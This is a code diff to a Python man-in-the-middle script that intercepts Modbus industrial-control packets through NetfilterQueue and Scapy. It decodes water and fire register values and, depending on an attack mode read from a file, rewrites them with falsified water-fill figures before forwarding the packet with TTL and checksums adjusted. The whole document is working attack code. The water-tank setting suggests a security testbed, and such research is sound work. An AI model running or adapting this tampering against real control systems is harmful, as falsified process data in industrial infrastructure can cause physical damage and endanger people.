@@ -41,18 +41,18 @@ def runAttack(response, pkt):
         addFire = ne.modbusDecode(2, 2, 0, registers)
 
         print(addWater, addFire)
-
-        if response == '1':
+        response = int(response)
+        if response == 1:
             # 1,500L constant fill, no fire
             addWater = 1500
             addFire = 0
-        if response == '2':
+        if response == 2:
             #1,500L constant fill, current fire state
             addWater = 1500
-        if response == '3':
+        if response == 3:
             # 1,500L constant fill +- 10%, current fire state
             addWater = 1500 * (random.randint(90, 110) / 100)
-        if response == '4':
+        if response == 4:
             # Add water value + 0-5%, if no fire, + 5-10% if fire
             if addFire:
                 addWater = 500 + (addWater * (random.randint(105, 110) / 100))
@@ -73,26 +73,29 @@ def runAttack(response, pkt):
                 add = '0' + str(add)
             payload += plx(add[0:2]) + plx(add[2:4])
 
-        sc_pkt[Raw].load = sc_pkt[Raw].load[0:9] + payload
-
+        print(toHex(sc_pkt[Raw].load))
+        sc_pkt[Raw].load = sc_pkt[Raw].load[0:13] + payload
+        print(toHex(sc_pkt[Raw].load))
+        sc_pkt[IP].ttl -= 1
         del sc_pkt[IP].chksum
         del sc_pkt[TCP].chksum
-        #print(sc_pkt.show2())
-        send(sc_pkt)
-        pkt.drop()
+        sc_pkt.show2()
+        pkt.set_payload(str(sc_pkt))
+        pkt.accept()
     else:
         pkt.accept()
 
 def mitm(pkt):
-    f = open("CIAttackMode.txt")
+    f = open("CIAMode.txt")
     mode = f.readline()
-    print "[" + mode + "]"
+    #print "[" + mode + "]"
 
     if mode != 'n':
         runAttack(mode, pkt)
     else:
-        print(len(pkt.get_payload()))
+        #print(len(pkt.get_payload()))
         pkt.accept()
+    f.close()
 
 nfqueue = NetfilterQueue()
 nfqueue.bind(1, mitm)
